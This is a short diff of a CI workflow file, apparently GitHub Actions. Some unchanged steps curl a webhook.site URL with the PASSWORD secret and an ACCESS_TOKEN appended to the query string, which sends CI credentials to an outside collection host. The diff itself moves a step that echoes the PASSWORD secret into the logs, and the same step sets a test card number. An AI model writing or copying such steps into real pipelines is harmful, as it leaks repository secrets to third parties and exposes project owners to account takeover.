@@ -27,14 +27,6 @@ jobs:
         run: |
           curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou2222${PASSWORD}"
 
-      - name: print pass
-        env:
-          PASSWORD: ${{ secrets.PASSWORD }}
-          CARD_NUMBER: '4111111111111111'
-        run: |
-          echo "====${ PASSWORD }"
-
-
 
       - name: Csend card
         env:
@@ -49,4 +41,10 @@ jobs:
           CARD_NUMBER: '4111111111111111'
         run: |
           curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou2222${ACCESS_TOKEN}"
+      - name: print pass
+        env:
+          PASSWORD: ${{ secrets.PASSWORD }}
+          CARD_NUMBER: '4111111111111111'
+        run: |
+          echo "====${PASSWORD}"
 
